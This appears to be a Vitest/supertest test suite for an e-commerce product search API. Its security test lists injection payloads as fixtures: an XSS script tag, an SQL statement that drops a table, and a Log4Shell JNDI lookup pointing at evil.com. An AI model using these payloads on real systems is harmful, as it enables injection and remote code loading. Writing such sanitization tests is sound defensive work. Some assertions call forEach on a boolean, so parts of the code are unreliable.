import { describe, it, expect, beforeAll, afterAll, beforeEach, vi } from 'vitest';
import request from 'supertest';
import { app } from '../../setup';
import { setupTestDatabase, cleanupTestDatabase } from '../../setup';

describe('搜索系统测试', () => {
  beforeAll(async () => {
    await setupTestDatabase();
  });

  afterAll(async () => {
    await cleanupTestDatabase();
  });

  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('商品搜索功能', () => {
    it('should search products by keyword', async () => {
      // 创建测试商品
      const products = [
        { name: 'iPhone 15 Pro', price: 8999, category: 'phones' },
        { name: 'iPhone 15', price: 6999, category: 'phones' },
        { name: 'MacBook Pro', price: 15999, category: 'laptops' },
        { name: 'AirPods Pro', price: 1999, category: 'audio' },
        { name: 'Samsung Galaxy S24', price: 7999, category: 'phones' }
      ];

      // 批量创建商品
      for (const product of products) {
        await request(app)
          .post('/api/v1/admin/products')
          .send({
            ...product,
            description: `High quality ${product.name}`,
            tags: ['electronics', 'premium']
          });
      }

      // 搜索iPhone相关商品
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: 'iPhone',
          limit: 10,
          offset: 0
        })
        .expect(200);

      expect(response.body.data.products.length).toBe(2);
      response.body.data.products.forEach((product: any) => {
        expect(product.name).toContain('iPhone');
      });

      // 验证搜索结果包含高亮信息
      expect(response.body.data.products[0].highlight).toBeDefined();
    });

    it('should support fuzzy search', async () => {
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: 'iphon', // 拼写错误
          fuzzy: true,
          limit: 10
        })
        .expect(200);

      // 应该返回iPhone商品
      expect(response.body.data.products.length).toBeGreaterThan(0);
      expect(response.body.data.products[0].score).toBeGreaterThan(0);
    });

    it('should filter search results', async () => {
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: 'Pro',
          category: 'phones',
          minPrice: 8000,
          maxPrice: 10000,
          sortBy: 'price',
          sortOrder: 'asc',
          limit: 10
        })
        .expect(200);

      // 验证过滤条件
      response.body.data.products.forEach((product: any) => {
        expect(product.name).toContain('Pro');
        expect(product.category).toBe('phones');
        expect(product.price).toBeGreaterThanOrEqual(8000);
        expect(product.price).toBeLessThanOrEqual(10000);
      });

      // 验证排序
      for (let i = 1; i < response.body.data.products.length; i++) {
        expect(
          response.body.data.products[i].price
        ).toBeGreaterThanOrEqual(
          response.body.data.products[i - 1].price
        );
      }
    });

    it('should support faceted search', async () => {
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: 'electronics',
          facets: true,
          limit: 0 // 只要分面信息
        })
        .expect(200);

      expect(response.body.data).toHaveProperty('facets');
      expect(response.body.data.facets).toHaveProperty('categories');
      expect(response.body.data.facets).toHaveProperty('priceRanges');
      expect(response.body.data.facets).toHaveProperty('brands');
      expect(response.body.data.facets).toHaveProperty('ratings');

      // 验证分面数据结构
      Object.values(response.body.data.facets).forEach((facet: any) => {
        Array.isArray(facet).forEach((item: any) => {
          expect(item).toHaveProperty('value');
          expect(item).toHaveProperty('count');
        });
      });
    });

    it('should handle complex search queries', async () => {
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: '(iPhone OR Samsung) AND (Pro OR Pro Max)',
          fields: 'name,description,tags',
          exclude: 'refurbished,used',
          mustHaveTags: ['5G', 'OLED'],
          limit: 10
        })
        .expect(200);

      expect(response.body.data.query).toBeDefined();
      expect(response.body.data.filters).toBeDefined();
      expect(response.body.data.totalFound).toBeDefined();
    });
  });

  describe('搜索建议和自动完成', () => {
    it('should provide search suggestions', async () => {
      const response = await request(app)
        .get('/api/v1/search/suggestions')
        .query({
          q: 'iPh',
          limit: 10
        })
        .expect(200);

      expect(Array.isArray(response.body.data.suggestions)).toBe(true);
      response.body.data.suggestions.forEach((suggestion: any) => {
        expect(suggestion).toHaveProperty('text');
        expect(suggestion).toHaveProperty('type'); // product, category, brand
        expect(suggestion).toHaveProperty('count');
      });

      // 应该包含iPhone相关建议
      const iPhoneSuggestions = response.body.data.suggestions.filter(
        (s: any) => s.text.toLowerCase().includes('iphone')
      );
      expect(iPhoneSuggestions.length).toBeGreaterThan(0);
    });

    it('should track popular search terms', async () => {
      // 执行多次搜索
      const searchTerms = ['iPhone', 'MacBook', 'AirPods'];
      for (const term of searchTerms) {
        for (let i = 0; i < 5; i++) {
          await request(app)
            .get('/api/v1/search/products')
            .query({ q: term });
        }
      }

      // 获取热门搜索词
      const response = await request(app)
        .get('/api/v1/search/trending')
        .expect(200);

      expect(Array.isArray(response.body.data.trending)).toBe(true);
      searchTerms.forEach(term => {
        const found = response.body.data.trending.find(
          (t: any) => t.term.toLowerCase() === term.toLowerCase()
        );
        expect(found).toBeDefined();
        expect(found.count).toBe(5);
      });
    });

    it('should personalize search suggestions', async () => {
      const userToken = 'test-user-token';

      // 模拟用户搜索历史
      await request(app)
        .post('/api/v1/search/history')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          query: 'iPhone accessories',
          timestamp: new Date().toISOString()
        });

      const response = await request(app)
        .get('/api/v1/search/suggestions')
        .set('Authorization', `Bearer ${userToken}`)
        .query({
          q: 'iPh',
          personalized: true
        })
        .expect(200);

      // 应该包含个性化建议
      expect(response.body.data.personalized).toBe(true);

      const personalizedSuggestions = response.body.data.suggestions.filter(
        (s: any) => s.personalized
      );
      expect(personalizedSuggestions.length).toBeGreaterThan(0);
    });
  });

  describe('搜索性能优化', () => {
    it('should use search cache effectively', async () => {
      const query = 'iPhone 15';

      // 第一次搜索
      const start1 = Date.now();
      await request(app)
        .get('/api/v1/search/products')
        .query({ q: query });
      const duration1 = Date.now() - start1;

      // 第二次相同搜索（应该使用缓存）
      const start2 = Date.now();
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({ q: query });
      const duration2 = Date.now() - start2;

      // 第二次应该更快（使用缓存）
      expect(duration2).toBeLessThan(duration1);
      expect(response.headers['x-search-cache']).toBe('hit');
    });

    it('should handle search index updates', async () => {
      // 创建新商品
      const newProduct = await request(app)
        .post('/api/v1/admin/products')
        .send({
          name: 'New Test Product',
          price: 999,
          category: 'test'
        })
        .expect(201);

      // 等待索引更新
      await new Promise(resolve => setTimeout(resolve, 1000));

      // 搜索新商品
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({ q: 'New Test Product' })
        .expect(200);

      expect(response.body.data.products.length).toBeGreaterThan(0);
      expect(response.body.data.products[0].id).toBe(newProduct.body.data.id);
    });

    it('should handle search timeouts gracefully', async () => {
      // 模拟超慢查询
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: 'test',
          timeout: 1, // 1ms超时
          limit: 10000 // 大量结果
        })
        .expect(200);

      // 应该返回部分结果或超时提示
      expect(response.body.data).toHaveProperty('timeout');
      expect(response.body.data).toHaveProperty('partialResults');
    });
  });

  describe('高级搜索功能', () => {
    it('should support boolean search operators', async () => {
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: 'iPhone AND Pro OR Galaxy',
          operator: 'boolean',
          limit: 10
        })
        .expect(200);

      // 验证布尔搜索结果
      expect(response.body.data.products.length).toBeGreaterThan(0);
      expect(response.body.data.query).toContain('AND');
      expect(response.body.data.query).toContain('OR');
    });

    it('should support phrase search', async () => {
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: '"iPhone 15 Pro"',
          exactMatch: true,
          limit: 10
        })
        .expect(200);

      // 应该只返回完全匹配的结果
      response.body.data.products.forEach((product: any) => {
        expect(product.name).toBe('iPhone 15 Pro');
      });
    });

    it('should support proximity search', async () => {
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: 'iPhone NEAR/3 Pro',
          proximity: true,
          limit: 10
        })
        .expect(200);

      // iPhone和Pro应该相邻或在3个词内
      response.body.data.products.forEach((product: any) => {
        const text = `${product.name} ${product.description}`.toLowerCase();
        const iPhoneIndex = text.indexOf('iphone');
        const proIndex = text.indexOf('pro');

        if (iPhoneIndex !== -1 && proIndex !== -1) {
          const distance = Math.abs(iPhoneIndex - proIndex);
          expect(distance).toBeLessThanOrEqual(30); // 近似检查
        }
      });
    });

    it('should support wildcard search', async () => {
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: 'Pro*',
          wildcard: true,
          limit: 10
        })
        .expect(200);

      // 应该返回所有以Pro开头的商品
      response.body.data.products.forEach((product: any) => {
        expect(
          product.name.toLowerCase().startsWith('pro') ||
          product.name.toLowerCase().includes(' pro')
        ).toBe(true);
      });
    });
  });

  describe('搜索分析和统计', () => {
    it('should track search analytics', async () => {
      // 执行各种搜索
      const searches = [
        { q: 'iPhone', filters: { category: 'phones' } },
        { q: 'MacBook', filters: { minPrice: 10000 } },
        { q: 'AirPods', sortBy: 'price' },
        { q: '', filters: { category: 'laptops' } }, // 无查询词
        { q: 'xyz123' } // 无结果
      ];

      for (const search of searches) {
        await request(app)
          .get('/api/v1/search/products')
          .query(search);
      }

      // 获取搜索统计
      const response = await request(app)
        .get('/api/v1/search/analytics')
        .query({
          startDate: new Date(Date.now() - 86400000).toISOString(),
          endDate: new Date().toISOString()
        })
        .expect(200);

      expect(response.body.data).toHaveProperty('totalSearches');
      expect(response.body.data).toHaveProperty('uniqueQueries');
      expect(response.body.data).toHaveProperty('avgResults');
      expect(response.body.data).toHaveProperty('noResultQueries');
      expect(response.body.data).toHaveProperty('popularFilters');
      expect(response.body.data).toHaveProperty('conversionRate');
    });

    it('should provide search performance metrics', async () => {
      const metrics = await request(app)
        .get('/api/v1/search/metrics')
        .expect(200);

      expect(metrics.body.data).toHaveProperty('avgQueryTime');
      expect(metrics.body.data).toHaveProperty('cacheHitRate');
      expect(metrics.body.data).toHaveProperty('indexSize');
      expect(metrics.body.data).toHaveProperty('documentsIndexed');
      expect(metrics.body.data).toHaveProperty('queriesPerSecond');
      expect(metrics.body.data).toHaveProperty('slowQueries');
    });

    it('should identify search optimization opportunities', async () => {
      const recommendations = await request(app)
        .get('/api/v1/search/recommendations')
        .expect(200);

      expect(recommendations.body.data).toHaveProperty('indexOptimizations');
      expect(recommendations.body.data).toHaveProperty('queryOptimizations');
      expect(recommendations.body.data).toHaveProperty('contentImprovements');
      expect(recommendations.body.data).toHaveProperty('userExperience');

      Array.isArray(recommendations.body.data.queryOptimizations).forEach(
        (opt: any) => {
          expect(opt).toHaveProperty('type');
          expect(opt).toHaveProperty('description');
          expect(opt).toHaveProperty('impact');
          expect(opt).toHaveProperty('implementation');
        }
      );
    });
  });

  describe('多语言搜索支持', () => {
    it('should support Chinese search', async () => {
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: '苹果手机',
          lang: 'zh',
          limit: 10
        })
        .expect(200);

      expect(response.body.data.products.length).toBeGreaterThan(0);
      expect(response.body.data.lang).toBe('zh');
    });

    it('should handle language auto-detection', async () => {
      const response = await request(app)
        .get('/api/v1/search/products')
        .query({
          q: '手机iPhone',
          detectLang: true,
          limit: 10
        })
        .expect(200);

      expect(response.body.data.detectedLang).toBeDefined();
      expect(['zh', 'en', 'mixed']).toContain(response.body.data.detectedLang);
    });
  });

  describe('搜索安全', () => {
    it('should sanitize search queries', async () => {
      const maliciousQueries = [
        '<script>alert("xss")</script>',
        "'; DROP TABLE products; --",
        '${jndi:ldap://evil.com/a}',
        '___EOF___'
      ];

      for (const query of maliciousQueries) {
        const response = await request(app)
          .get('/api/v1/search/products')
          .query({ q: query })
          .expect(200);

        // 应该返回安全的结果
        expect(response.body.data.sanitizedQuery).toBeDefined();
        expect(response.body.data.sanitizedQuery).not.toContain('<script>');
        expect(response.body.data.sanitizedQuery).not.toContain('DROP TABLE');
      }
    });

    it('should rate limit search requests', async () => {
      const promises = Array(100).fill(null).map(() =>
        request(app)
          .get('/api/v1/search/products')
          .query({ q: 'test' })
      );

      const responses = await Promise.all(promises);

      const rateLimited = responses.filter(r => r.status === 429);
      const successful = responses.filter(r => r.status === 200);

      expect(rateLimited.length).toBeGreaterThan(0);
      expect(successful.length).toBeLessThan(100);
    });
  });
});